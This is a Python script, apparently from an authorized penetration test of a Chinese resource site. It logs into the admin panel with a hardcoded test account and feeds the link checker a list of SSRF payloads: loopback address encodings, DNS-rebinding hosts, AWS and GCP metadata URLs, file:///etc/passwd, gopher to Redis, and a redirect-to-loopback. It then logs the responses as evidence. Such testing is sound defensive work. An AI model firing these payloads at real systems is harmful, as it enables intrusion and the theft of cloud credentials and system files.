#!/usr/bin/env python3
"""07 SSRF：链接检查器的目标校验与出网行为（容器内 DNS/回环/元数据/重定向）。"""
import json
import re
import sys
import time

sys.path.insert(0, "/media/sunhao/F/Project/sanjiang-resources-site/reports/security/2026-10-21-attacker/scripts")
from probe_client import session, req, csrf_from, BASE, record

ADMIN = ("atk-admin", "Atk2026-Adm1n!x")
RES = {}

URLS = [
    ("loopback", "https://127.0.0.1:4321/api/health/"),
    ("loopback-name", "https://localhost:4321/api/health/"),
    ("loopback-short", "https://127.1:4321/api/health/"),
    ("loopback-hex", "https://0x7f000001:4321/api/health/"),
    ("loopback-int", "https://2130706433:4321/api/health/"),
    ("loopback-v6", "https://[::1]:4321/api/health/"),
    ("loopback-v6mapped", "https://[::ffff:127.0.0.1]:4321/api/health/"),
    ("nipio", "https://127.0.0.1.nip.io:4321/api/health/"),
    ("nipio-8443", "https://127.0.0.1.nip.io:8443/api/health/"),
    ("localtest", "https://localtest.me:4321/api/health/"),
    ("srv-name", "https://sanjiang-atk-app:4321/api/health/"),
    ("aws-meta", "https://169.254.169.254/latest/meta-data/"),
    ("gcp-meta", "https://metadata.google.internal/computeMetadata/v1/"),
    ("http-scheme", "http://127.0.0.1:4321/api/health/"),
    ("file-scheme", "file:///etc/passwd"),
    ("gopher", "gopher://127.0.0.1:6379/_INFO"),
    ("javascript", "javascript:alert(1)"),
    ("data", "data:text/html,<b>x</b>"),
    ("redirect-to-loopback", "https://httpbingo.org/redirect-to?url=https%3A%2F%2F127.0.0.1%3A4321%2Fapi%2Fhealth%2F"),
    ("public", "https://example.com/"),
    ("decimal-dns", "https://127.0.0.1.sslip.io:4321/api/health/"),
]


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:400]}")


def csrf(s, path="/admin/"):
    return csrf_from(s.get(BASE + path, timeout=20).text)


def main():
    s = session()
    s.post(BASE + "/api/login/", data={"username": ADMIN[0], "password": ADMIN[1]},
           headers={"Origin": BASE}, allow_redirects=False, timeout=20)
    results = []
    for i, (label, url) in enumerate(URLS):
        rid = f"ssrf-{i}"
        res = {
            "id": rid, "title": f"SSRF 探针 {label}", "summary": "链接检查目标校验探针。",
            "category": "design", "kind": "开源工具", "cost": "免费",
            "platforms": ["Windows"], "tags": ["探针"],
            "url": url, "sourceUrl": "https://example.com/",
            "license": "测试", "eligibility": "测试", "caveat": "测试", "steps": ["1", "2", "3"],
            "status": "verified", "checkedAt": "2026-10-21",
            "image": "/images/gimp.png", "imageAlt": "x", "access": "open",
            "imageRights": "confirmed", "imageCredit": "x",
        }
        c = csrf(s, "/admin/resources/new/")
        r = s.post(BASE + "/api/manage/", data={"csrf": c, "action": "save-resource",
                                               "resource": json.dumps(res, ensure_ascii=False)},
                   headers={"Origin": BASE}, allow_redirects=False, timeout=30)
        save_status = r.status_code
        # 触发链接检查
        c = csrf(s, f"/admin/resources/{rid}/")
        r2 = s.post(BASE + "/api/manage/", data={"csrf": c, "action": "check-link", "id": rid},
                    headers={"Origin": BASE}, allow_redirects=False, timeout=60)
        detail = s.get(BASE + f"/admin/resources/{rid}/", timeout=30)
        txt = re.sub(r"<[^>]+>", " ", detail.text)
        txt = re.sub(r"\s+", " ", txt)
        m = re.search(r"(链接检查[^。]{0,120}|检查结果[^。]{0,120}|不允许[^。]{0,80}|无法[^。]{0,80})", txt)
        results.append({"label": label, "url": url, "save_status": save_status,
                        "check_status": r2.status_code,
                        "redirect": r2.headers.get("location"),
                        "check_msg": m.group(1) if m else None})
        record("ssrf-" + label, "POST", "/api/manage/", r2, {"Origin": BASE},
               {"action": "check-link", "id": rid, "url": url},
               {"save_status": save_status, "check_msg": m.group(1) if m else None})
        time.sleep(0.3)
    note("ssrf_results", results)
    with open("/tmp/sj-attacker/evidence/07-ssrf-summary.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
